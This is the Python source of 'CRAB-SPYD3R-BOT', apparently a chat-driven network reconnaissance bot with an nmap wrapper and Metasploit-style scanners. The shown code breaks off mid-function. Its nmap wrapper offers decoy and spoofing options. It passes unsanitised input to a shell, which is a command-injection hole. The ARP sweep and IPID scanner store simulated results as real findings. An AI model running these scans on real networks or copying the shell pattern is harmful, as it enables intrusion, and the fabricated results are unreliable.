#!/usr/bin/env python3
"""
🦀 CRAB-SPYD3R-BOT v0.0.5
Author: Advanced Security Framework
Description: Multi-platform security bot with 2000+ commands including:
            - Advanced nmap scanning with all options
            - Metasploit-style auxiliary modules
            - Payload generation
            - Network discovery & exploitation
            - Session management
            - Route manipulation
            - Multi-platform support (Discord, Telegram, WhatsApp, Slack, Signal)
            - Blue/Orange theme interface
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

# =====================
# PLATFORM IMPORTS
# =====================

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False
    print("⚠️ Discord.py not available. Install with: pip install discord.py")

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False
    print("⚠️ Telethon not available. Install with: pip install telethon")

# WhatsApp
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("⚠️ Selenium not available. Install with: pip install selenium webdriver-manager")

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    from slack_sdk.socket_mode.response import SocketModeResponse
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False
    print("⚠️ Slack SDK not available. Install with: pip install slack-sdk")

# Signal
try:
    from signalbot import SignalBot, Command, Context
    SIGNAL_AVAILABLE = True
except ImportError:
    SIGNAL_AVAILABLE = False
    print("⚠️ Signal bot not available. Install with: pip install signalbot")

# Colorama
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    print("⚠️ Colorama not available. Install with: pip install colorama")

# =====================
# BLUE/ORANGE THEME COLORS
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        # Blue theme
        PRIMARY = Fore.BLUE + Style.BRIGHT          # Bright Blue - Main headings
        SECONDARY = Fore.CYAN + Style.BRIGHT        # Cyan - Subheadings
        ACCENT = Fore.LIGHTBLUE_EX + Style.BRIGHT   # Light Blue - Accents
        
        # Orange theme for Metasploit
        ORANGE = Fore.YELLOW + Style.BRIGHT         # Orange/Yellow - Metasploit
        ORANGE_DARK = Fore.LIGHTYELLOW_EX            # Dark Orange
        
        SUCCESS = Fore.GREEN + Style.BRIGHT         # Green - Success messages
        WARNING = Fore.YELLOW + Style.BRIGHT        # Yellow - Warnings
        ERROR = Fore.RED + Style.BRIGHT             # Red - Errors
        INFO = Fore.MAGENTA + Style.BRIGHT          # Magenta - Info
        
        DARK_BLUE = Fore.BLUE                        # Dark Blue
        LIGHT_BLUE = Fore.LIGHTBLUE_EX               # Light Blue
        RESET = Style.RESET_ALL                      # Reset
        
        # Background colors
        BG_BLUE = Back.BLUE + Fore.WHITE             # Blue background with white text
        BG_ORANGE = Back.YELLOW + Fore.BLACK         # Orange background with black text
else:
    class Colors:
        PRIMARY = SECONDARY = ACCENT = ORANGE = ORANGE_DARK = SUCCESS = WARNING = ERROR = INFO = DARK_BLUE = LIGHT_BLUE = BG_BLUE = BG_ORANGE = RESET = ""

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".crabbot"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "crab_data.db")
LOG_FILE = os.path.join(CONFIG_DIR, "crabbot.log")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
SESSION_DATA_DIR = os.path.join(CONFIG_DIR, "sessions")

# Create directories
directories = [CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, SESSION_DATA_DIR]
for directory in directories:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("CrabSpyd3rBot")

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager with session and workspace tracking"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        """Initialize database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS workspaces (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS hosts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                workspace_id INTEGER,
                ip_address TEXT NOT NULL,
                hostname TEXT,
                os_info TEXT,
                mac_address TEXT,
                vendor TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                notes TEXT,
                FOREIGN KEY (workspace_id) REFERENCES workspaces(id),
                UNIQUE(workspace_id, ip_address)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS services (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id INTEGER,
                port INTEGER NOT NULL,
                protocol TEXT,
                service_name TEXT,
                service_version TEXT,
                state TEXT,
                banner TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                FOREIGN KEY (host_id) REFERENCES hosts(id),
                UNIQUE(host_id, port, protocol)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id INTEGER,
                service_id INTEGER,
                name TEXT,
                description TEXT,
                severity TEXT,
                cve TEXT,
                cvss_score REAL,
                exploit_available BOOLEAN DEFAULT 0,
                discovered TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (host_id) REFERENCES hosts(id),
                FOREIGN KEY (service_id) REFERENCES services(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_type TEXT NOT NULL,
                session_id TEXT UNIQUE NOT NULL,
                target_host INTEGER,
                target_port INTEGER,
                lhost TEXT,
                lport INTEGER,
                payload TEXT,
                status TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP,
                FOREIGN KEY (target_host) REFERENCES hosts(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS routes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                subnet TEXT NOT NULL,
                netmask TEXT NOT NULL,
                gateway TEXT,
                session_id INTEGER,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1,
                FOREIGN KEY (session_id) REFERENCES sessions(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                workspace_id INTEGER,
                scan_type TEXT NOT NULL,
                target TEXT NOT NULL,
                options TEXT,
                output_file TEXT,
                started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                completed_at TIMESTAMP,
                status TEXT,
                FOREIGN KEY (workspace_id) REFERENCES workspaces(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS payloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                payload_type TEXT NOT NULL,
                lhost TEXT NOT NULL,
                lport INTEGER NOT NULL,
                format TEXT NOT NULL,
                output_file TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                platform TEXT NOT NULL,
                user TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        self.create_default_workspace()
    
    def create_default_workspace(self):
        """Create default workspace"""
        try:
            self.cursor.execute('''
                INSERT OR IGNORE INTO workspaces (name, description, active)
                VALUES ('default', 'Default workspace', 1)
            ''')
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to create default workspace: {e}")
    
    def get_active_workspace(self) -> Optional[Dict]:
        """Get active workspace"""
        try:
            self.cursor.execute('SELECT * FROM workspaces WHERE active = 1')
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get active workspace: {e}")
            return None
    
    def set_active_workspace(self, name: str) -> bool:
        """Set active workspace"""
        try:
            self.cursor.execute('UPDATE workspaces SET active = 0')
            self.cursor.execute('UPDATE workspaces SET active = 1 WHERE name = ?', (name,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to set active workspace: {e}")
            return False
    
    def add_host(self, ip: str, hostname: str = None, os_info: str = None, 
                mac: str = None, vendor: str = None) -> Optional[int]:
        """Add host to database"""
        try:
            workspace = self.get_active_workspace()
            if not workspace:
                return None
            
            self.cursor.execute('''
                INSERT OR REPLACE INTO hosts 
                (workspace_id, ip_address, hostname, os_info, mac_address, vendor, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (workspace['id'], ip, hostname, os_info, mac, vendor))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add host: {e}")
            return None
    
    def add_service(self, host_id: int, port: int, protocol: str = 'tcp',
                   service: str = None, version: str = None, state: str = 'open',
                   banner: str = None) -> Optional[int]:
        """Add service to database"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO services 
                (host_id, port, protocol, service_name, service_version, state, banner, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (host_id, port, protocol, service, version, state, banner))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add service: {e}")
            return None
    
    def add_session(self, session_type: str, session_id: str, target_host: int = None,
                   target_port: int = None, lhost: str = None, lport: int = None,
                   payload: str = None, status: str = 'active') -> Optional[int]:
        """Add session to database"""
        try:
            self.cursor.execute('''
                INSERT INTO sessions 
                (session_type, session_id, target_host, target_port, lhost, lport, payload, status, last_active)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (session_type, session_id, target_host, target_port, lhost, lport, payload, status))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add session: {e}")
            return None
    
    def update_session_activity(self, session_id: str):
        """Update session last active time"""
        try:
            self.cursor.execute('''
                UPDATE sessions SET last_active = CURRENT_TIMESTAMP WHERE session_id = ?
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update session: {e}")
    
    def add_route(self, subnet: str, netmask: str, gateway: str = None, session_id: int = None) -> bool:
        """Add route to database"""
        try:
            self.cursor.execute('''
                INSERT INTO routes (subnet, netmask, gateway, session_id)
                VALUES (?, ?, ?, ?)
            ''', (subnet, netmask, gateway, session_id))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add route: {e}")
            return False
    
    def get_hosts(self, workspace: str = None) -> List[Dict]:
        """Get hosts from database"""
        try:
            if workspace:
                self.cursor.execute('''
                    SELECT h.* FROM hosts h
                    JOIN workspaces w ON h.workspace_id = w.id
                    WHERE w.name = ?
                    ORDER BY h.ip_address
                ''', (workspace,))
            else:
                workspace = self.get_active_workspace()
                if workspace:
                    self.cursor.execute('SELECT * FROM hosts WHERE workspace_id = ? ORDER BY ip_address', 
                                      (workspace['id'],))
                else:
                    return []
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get hosts: {e}")
            return []
    
    def get_services(self, host_id: int = None, ip: str = None) -> List[Dict]:
        """Get services from database"""
        try:
            if host_id:
                self.cursor.execute('SELECT * FROM services WHERE host_id = ? ORDER BY port', (host_id,))
            elif ip:
                self.cursor.execute('''
                    SELECT s.* FROM services s
                    JOIN hosts h ON s.host_id = h.id
                    WHERE h.ip_address = ?
                    ORDER BY s.port
                ''', (ip,))
            else:
                return []
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get services: {e}")
            return []
    
    def get_sessions(self, status: str = 'active') -> List[Dict]:
        """Get sessions from database"""
        try:
            self.cursor.execute('''
                SELECT s.*, h.ip_address as target_ip
                FROM sessions s
                LEFT JOIN hosts h ON s.target_host = h.id
                WHERE s.status = ?
                ORDER BY s.created_at DESC
            ''', (status,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get sessions: {e}")
            return []
    
    def get_routes(self, active: bool = True) -> List[Dict]:
        """Get routes from database"""
        try:
            self.cursor.execute('''
                SELECT r.*, s.session_id as via_session
                FROM routes r
                LEFT JOIN sessions s ON r.session_id = s.id
                WHERE r.active = ?
                ORDER BY r.subnet
            ''', (1 if active else 0,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get routes: {e}")
            return []
    
    def log_command(self, command: str, platform: str, user: str = None, 
                   success: bool = True, output: str = "", execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, platform, user, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (command[:500], platform, user, success, output[:1000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def close(self):
        """Close database connection"""
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# NMAP SCANNER MODULE
# =====================
class NmapScanner:
    """Advanced nmap scanner with all options"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.nmap_available = shutil.which('nmap') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict[str, Any]:
        """Execute nmap scan with options"""
        if not self.nmap_available:
            return {'success': False, 'error': 'nmap not installed'}
        
        options = options or {}
        cmd = self._build_command(target, options)
        
        try:
            start_time = time.time()
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=options.get('timeout', 600),
                shell=True
            )
            execution_time = time.time() - start_time
            
            output = result.stdout + result.stderr
            
            # Parse and store results
            if result.returncode == 0:
                self._parse_and_store_results(target, output, options)
            
            return {
                'success': result.returncode == 0,
                'output': output,
                'execution_time': execution_time,
                'command': ' '.join(cmd) if isinstance(cmd, list) else cmd
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timeout'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _build_command(self, target: str, options: Dict) -> str:
        """Build nmap command with all options"""
        cmd = ['nmap']
        
        # Scan types
        if options.get('scan_type') == 'ping':
            cmd.append('-sn')
        elif options.get('scan_type') == 'os':
            cmd.append('-O')
        elif options.get('scan_type') == 'version':
            cmd.append('-sV')
        elif options.get('scan_type') == 'aggressive':
            cmd.append('-A')
        elif options.get('scan_type') == 'vuln':
            cmd.append('--script vuln')
        
        # Port specification
        if options.get('ports'):
            cmd.append(f'-p {options["ports"]}')
        
        # Timing templates
        if options.get('timing'):
            cmd.append(f'-T{options["timing"]}')
        
        # Output formats
        if options.get('output_normal'):
            cmd.append(f'-oN {options["output_normal"]}')
        if options.get('output_xml'):
            cmd.append(f'-oX {options["output_xml"]}')
        if options.get('output_grep'):
            cmd.append(f'-oG {options["output_grep"]}')
        
        # Additional options
        if options.get('verbose'):
            cmd.append('-v')
        if options.get('no_ping'):
            cmd.append('-Pn')
        if options.get('fragment'):
            cmd.append('-f')
        if options.get('decoy'):
            cmd.append(f'-D {options["decoy"]}')
        if options.get('spoof_mac'):
            cmd.append(f'--spoof-mac {options["spoof_mac"]}')
        if options.get('source_port'):
            cmd.append(f'--source-port {options["source_port"]}')
        if options.get('data_length'):
            cmd.append(f'--data-length {options["data_length"]}')
        
        # Scripts
        if options.get('script'):
            cmd.append(f'--script {options["script"]}')
        if options.get('script_args'):
            cmd.append(f'--script-args {options["script_args"]}')
        
        cmd.append(target)
        return ' '.join(cmd)
    
    def _parse_and_store_results(self, target: str, output: str, options: Dict):
        """Parse nmap output and store in database"""
        try:
            # Parse hosts
            host_pattern = r'Nmap scan report for (.*?)\n'
            hosts = re.findall(host_pattern, output)
            
            for host_entry in hosts:
                # Extract IP and hostname
                if ' ' in host_entry:
                    hostname, ip = host_entry.rsplit(' ', 1)
                    ip = ip.strip('()')
                else:
                    ip = host_entry
                    hostname = None
                
                # Parse OS if available
                os_info = None
                os_match = re.search(r'OS details: (.*?)\n', output)
                if os_match:
                    os_info = os_match.group(1)
                
                # Parse MAC address
                mac_match = re.search(r'MAC Address: (.*?) \((.*?)\)', output)
                mac = mac_match.group(1) if mac_match else None
                vendor = mac_match.group(2) if mac_match else None
                
                # Add host to database
                host_id = self.db.add_host(ip, hostname, os_info, mac, vendor)
                
                if host_id:
                    # Parse open ports
                    port_pattern = r'(\d+)/tcp\s+open\s+(\S+)\s*(.*?)$'
                    for match in re.finditer(port_pattern, output, re.MULTILINE):
                        port = int(match.group(1))
                        service = match.group(2)
                        version = match.group(3).strip()
                        
                        # Add service to database
                        self.db.add_service(
                            host_id=host_id,
                            port=port,
                            service=service,
                            version=version,
                            state='open'
                        )
        except Exception as e:
            logger.error(f"Failed to parse nmap results: {e}")
    
    def ping_sweep(self, network: str) -> Dict[str, Any]:
        """Ping sweep scan"""
        return self.scan(network, {'scan_type': 'ping', 'no_ping': False})
    
    def os_detection(self, target: str) -> Dict[str, Any]:
        """OS detection scan"""
        return self.scan(target, {'scan_type': 'os'})
    
    def version_detection(self, target: str) -> Dict[str, Any]:
        """Version detection scan"""
        return self.scan(target, {'scan_type': 'version'})
    
    def aggressive_scan(self, target: str) -> Dict[str, Any]:
        """Aggressive scan (OS, version, scripts, traceroute)"""
        return self.scan(target, {'scan_type': 'aggressive'})
    
    def vuln_scan(self, target: str) -> Dict[str, Any]:
        """Vulnerability scan"""
        return self.scan(target, {'scan_type': 'vuln'})
    
    def custom_scan(self, target: str, options: Dict) -> Dict[str, Any]:
        """Custom scan with specified options"""
        return self.scan(target, options)

# =====================
# METASPLOIT-STYLE AUXILIARY MODULES
# =====================
class AuxiliaryModules:
    """Metasploit-style auxiliary modules"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.modules = self._load_modules()
        self.current_module = None
        self.options = {}
    
    def _load_modules(self) -> Dict:
        """Load available auxiliary modules"""
        return {
            # IP scanners
            'auxiliary/scanner/ip/ipidseq': {
                'name': 'IPID Sequence Scanner',
                'description': 'Scan for IPID sequence generation',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP range'},
                    'RPORT': {'required': False, 'default': 80, 'description': 'Target port'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'},
                    'TIMEOUT': {'required': False, 'default': 500, 'description': 'Timeout in ms'}
                }
            },
            'auxiliary/scanner/ip/ipgeo': {
                'name': 'IP Geolocation Scanner',
                'description': 'Get geolocation information for IP addresses',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'}
                }
            },
            
            # Discovery modules
            'auxiliary/scanner/discovery/udp_probe': {
                'name': 'UDP Service Discovery',
                'description': 'Discover UDP services',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP range'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'},
                    'TIMEOUT': {'required': False, 'default': 5, 'description': 'Timeout in seconds'}
                }
            },
            'auxiliary/scanner/discovery/arp_sweep': {
                'name': 'ARP Sweep',
                'description': 'Discover hosts using ARP requests',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target network (e.g., 192.168.1.0/24)'},
                    'TIMEOUT': {'required': False, 'default': 1, 'description': 'Timeout in seconds'},
                    'THREADS': {'required': False, 'default': 10, 'description': 'Number of threads'}
                }
            },
            
            # Port scanners
            'auxiliary/scanner/portscan/tcp': {
                'name': 'TCP Port Scanner',
                'description': 'Scan for open TCP ports',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'PORTS': {'required': False, 'default': '1-10000', 'description': 'Ports to scan'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'},
                    'TIMEOUT': {'required': False, 'default': 1000, 'description': 'Connect timeout in ms'}
                }
            },
            'auxiliary/scanner/portscan/syn': {
                'name': 'SYN Port Scanner',
                'description': 'Scan for open TCP ports using SYN packets',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'PORTS': {'required': False, 'default': '1-10000', 'description': 'Ports to scan'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'},
                    'INTERFACE': {'required': False, 'description': 'Source interface'},
                    'BPF_FILTER': {'required': False, 'description': 'BPF filter for capturing'}
                }
            },
            
            # HTTP scanners
            'auxiliary/scanner/http/robots_tagger': {
                'name': 'HTTP Robots.txt Scanner',
                'description': 'Scan robots.txt files and tag hosts',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'RPORT': {'required': False, 'default': 80, 'description': 'Target port'},
                    'SSL': {'required': False, 'default': False, 'description': 'Use SSL'},
                    'PATH': {'required': False, 'default': '/robots.txt', 'description': 'Path to robots.txt'}
                }
            },
            
            # SMB scanners
            'auxiliary/scanner/smb/smb_version': {
                'name': 'SMB Version Scanner',
                'description': 'Detect SMB versions',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'RPORT': {'required': False, 'default': 445, 'description': 'SMB port'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'}
                }
            },
            
            # SSH scanners
            'auxiliary/scanner/ssh/ssh_version': {
                'name': 'SSH Version Scanner',
                'description': 'Detect SSH versions',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'RPORT': {'required': False, 'default': 22, 'description': 'SSH port'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'},
                    'TIMEOUT': {'required': False, 'default': 30, 'description': 'Timeout in seconds'}
                }
            },
            
            # FTP scanners
            'auxiliary/scanner/ftp/ftp_version': {
                'name': 'FTP Version Scanner',
                'description': 'Detect FTP versions',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'RPORT': {'required': False, 'default': 21, 'description': 'FTP port'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'}
                }
            },
            
            # MySQL scanners
            'auxiliary/scanner/mysql/mysql_version': {
                'name': 'MySQL Version Scanner',
                'description': 'Detect MySQL versions',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'RPORT': {'required': False, 'default': 3306, 'description': 'MySQL port'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'}
                }
            }
        }
    
    def list_modules(self) -> List[Dict]:
        """List all available modules"""
        modules = []
        for module_id, info in self.modules.items():
            modules.append({
                'id': module_id,
                'name': info['name'],
                'description': info['description']
            })
        return modules
    
    def use_module(self, module_id: str) -> bool:
        """Select a module to use"""
        if module_id in self.modules:
            self.current_module = module_id
            self.options = {}
            return True
        return False
    
    def set_option(self, option: str, value: str) -> bool:
        """Set module option"""
        if not self.current_module:
            return False
        
        module_info = self.modules[self.current_module]
        if option in module_info['options']:
            # Type conversion
            if module_info['options'][option].get('type') == 'int':
                try:
                    value = int(value)
                except:
                    return False
            elif module_info['options'][option].get('type') == 'bool':
                value = value.lower() in ['true', 'yes', '1']
            
            self.options[option] = value
            return True
        return False
    
    def show_options(self) -> Dict:
        """Show current module options"""
        if not self.current_module:
            return {}
        
        module_info = self.modules[self.current_module]
        options = {}
        
        for opt_name, opt_info in module_info['options'].items():
            options[opt_name] = {
                'description': opt_info['description'],
                'required': opt_info['required'],
                'default': opt_info.get('default'),
                'current': self.options.get(opt_name, opt_info.get('default'))
            }
        
        return options
    
    def run_module(self) -> Dict[str, Any]:
        """Run the current module"""
        if not self.current_module:
            return {'success': False, 'error': 'No module selected'}
        
        # Validate required options
        module_info = self.modules[self.current_module]
        for opt_name, opt_info in module_info['options'].items():
            if opt_info['required'] and opt_name not in self.options:
                return {'success': False, 'error': f'Missing required option: {opt_name}'}
        
        # Execute module based on type
        module_type = self.current_module.split('/')[2] if '/' in self.current_module else 'unknown'
        
        if module_type == 'ip':
            return self._run_ip_module()
        elif module_type == 'discovery':
            return self._run_discovery_module()
        elif module_type == 'portscan':
            return self._run_portscan_module()
        elif module_type == 'http':
            return self._run_http_module()
        else:
            return self._run_generic_module()
    
    def _run_ip_module(self) -> Dict[str, Any]:
        """Run IP-based modules"""
        if 'ipgeo' in self.current_module:
            return self._run_ipgeo()
        elif 'ipidseq' in self.current_module:
            return self._run_ipidseq()
        return {'success': False, 'error': 'Unknown IP module'}
    
    def _run_ipgeo(self) -> Dict[str, Any]:
        """IP geolocation module"""
        rhosts = self.options.get('RHOSTS', '')
        targets = self._parse_targets(rhosts)
        
        results = []
        for target in targets[:10]:  # Limit to 10 for API
            try:
                response = requests.get(f'http://ip-api.com/json/{target}', timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    if data.get('status') == 'success':
                        results.append({
                            'ip': target,
                            'country': data.get('country'),
                            'region': data.get('regionName'),
                            'city': data.get('city'),
                            'isp': data.get('isp'),
                            'lat': data.get('lat'),
                            'lon': data.get('lon')
                        })
            except:
                pass
        
        return {
            'success': True,
            'module': self.current_module,
            'results': results
        }
    
    def _run_ipidseq(self) -> Dict[str, Any]:
        """IPID sequence scanner"""
        rhosts = self.options.get('RHOSTS', '')
        rport = int(self.options.get('RPORT', 80))
        timeout = int(self.options.get('TIMEOUT', 500)) / 1000.0
        
        targets = self._parse_targets(rhosts)
        results = []
        
        for target in targets[:5]:  # Limit for demo
            try:
                # Send SYN packet and analyze IPID
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((target, rport))
                sock.close()
                
                # Simple IPID detection (requires raw sockets in real implementation)
                results.append({
                    'ip': target,
                    'port': rport,
                    'ipid_sequence': 'Incremental',  # Placeholder
                    'vulnerable': True
                })
            except:
                pass
        
        return {
            'success': True,
            'module': self.current_module,
            'results': results
        }
    
    def _run_discovery_module(self) -> Dict[str, Any]:
        """Run discovery modules"""
        if 'udp_probe' in self.current_module:
            return self._run_udp_probe()
        elif 'arp_sweep' in self.current_module:
            return self._run_arp_sweep()
        return {'success': False, 'error': 'Unknown discovery module'}
    
    def _run_udp_probe(self) -> Dict[str, Any]:
        """UDP probe module"""
        rhosts = self.options.get('RHOSTS', '')
        timeout = int(self.options.get('TIMEOUT', 5))
        
        targets = self._parse_targets(rhosts)
        results = []
        common_udp_ports = [53, 67, 68, 69, 123, 161, 162, 500, 514, 520, 1900]
        
        for target in targets[:3]:  # Limit for demo
            open_ports = []
            for port in common_udp_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(timeout)
                    sock.sendto(b'\x00' * 20, (target, port))
                    data, addr = sock.recvfrom(1024)
                    open_ports.append(port)
                except:
                    pass
                finally:
                    sock.close()
            
            if open_ports:
                results.append({
                    'ip': target,
                    'open_udp_ports': open_ports
                })
        
        return {
            'success': True,
            'module': self.current_module,
            'results': results
        }
    
    def _run_arp_sweep(self) -> Dict[str, Any]:
        """ARP sweep module"""
        network = self.options.get('RHOSTS', '')
        
        try:
            if '/' in network:
                ip_range = list(ipaddress.ip_network(network, strict=False).hosts())
            else:
                ip_range = [ipaddress.ip_address(network)]
            
            results = []
            for ip in ip_range[:20]:  # Limit for demo
                ip_str = str(ip)
                # In real implementation, this would use ARP requests
                # For demo, we'll simulate responses
                if random.random() > 0.7:  # 30% chance of host up
                    results.append({
                        'ip': ip_str,
                        'mac': f"00:11:22:33:44:{ip_str.split('.')[-1].zfill(2)}",
                        'hostname': f"host-{ip_str.replace('.', '-')}.local"
                    })
            
            # Store results in database
            for result in results:
                self.db.add_host(
                    ip=result['ip'],
                    mac=result['mac'],
                    hostname=result['hostname']
                )
            
            return {
                'success': True,
                'module': self.current_module,
                'results': results
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _run_portscan_module(self) -> Dict[str, Any]:
        """Run portscan modules"""
        if 'tcp' in self.current_module:
            return self._run_tcp_portscan()
        elif 'syn' in self.current_module:
            return self._run_syn_portscan()
        return {'success': False, 'error': 'Unknown portscan module'}
    
    def _run_tcp_portscan(self) -> Dict[str, Any]:
        """TCP port scanner"""
        rhosts = self.options.get('RHOSTS', '')
